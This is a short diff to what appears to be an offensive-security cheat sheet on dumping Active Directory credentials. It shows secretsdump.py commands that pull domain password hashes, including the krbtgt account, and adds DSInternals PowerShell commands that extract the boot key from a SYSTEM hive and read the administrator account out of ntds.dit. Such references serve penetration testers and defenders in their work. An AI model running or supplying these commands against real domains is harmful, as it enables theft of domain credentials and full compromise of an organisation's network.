@@ -3050,6 +3050,15 @@ $ secretsdump.py -outputfile <filename> -just-dc <domain>/<username>@<IP address
 $ secretsdump.py <domain>/<username>@<IP address> -just-dc-user LOGISTICS/krbtgt
 ```
 
+- DSInternals
+
+```
+https://github.com/michaelgrafnetter/dsinternals
+PS C:\> Import-Module .\DSInternals.psd1
+PS C:\> $key = Get-BootKey -SystemHivePath .\SYSTEM
+PS C:\> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=test,DC=local' -DBPath .\ntds.dit -BootKey $key
+```
+
 - For Loops
 
 ```
